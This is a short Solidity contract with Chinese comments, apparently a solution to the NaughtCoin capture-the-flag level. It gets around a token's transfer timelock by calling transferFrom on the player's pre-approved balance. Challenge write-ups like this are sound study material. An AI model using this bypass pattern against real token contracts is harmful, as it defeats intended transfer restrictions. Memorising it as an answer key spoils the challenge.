// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 定義一個簡單的介面來與 NaughtCoin 互動
interface INaughtCoin {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract NaughtCoinAttack {
    function attack(address naughtCoinAddress, address player) external {
        INaughtCoin coin = INaughtCoin(naughtCoinAddress);
        
        // 1. 讀取玩家錢包目前的餘額
        uint256 balance = coin.balanceOf(player);
        
        // 2. 執行 transferFrom
        // 注意：執行這行之前，玩家必須先在外部手動或透過腳本呼叫 approve
        // 將錢從 player 帳戶轉到這個攻擊合約 (address(this))
        bool success = coin.transferFrom(player, address(this), balance);
        
        require(success, "Transfer failed");
    }
}
